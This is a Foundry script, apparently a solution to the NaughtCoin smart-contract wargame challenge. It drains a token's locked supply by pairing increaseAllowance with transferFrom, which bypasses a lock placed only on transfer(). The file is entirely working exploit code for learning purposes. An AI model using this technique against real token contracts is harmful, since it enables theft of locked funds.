// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinScript is Script {
  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    address deployerAddress = vm.envAddress("DEPLOYER_ADDRESS");

    vm.startBroadcast(deployerPrivateKey);

    NaughtCoin exploitInstance = NaughtCoin(
      0x269641cA67F99cbEeD763fdBf70DDbFE06f60863
    );

    exploitInstance.increaseAllowance(
      deployerAddress,
      exploitInstance.INITIAL_SUPPLY()
    );

    exploitInstance.transferFrom(
      deployerAddress,
      address(this),
      exploitInstance.INITIAL_SUPPLY()
    );

    require(
      exploitInstance.balanceOf(address(this)) >=
        exploitInstance.INITIAL_SUPPLY(),
      "Exploit failed"
    );

    vm.stopBroadcast();
  }
}
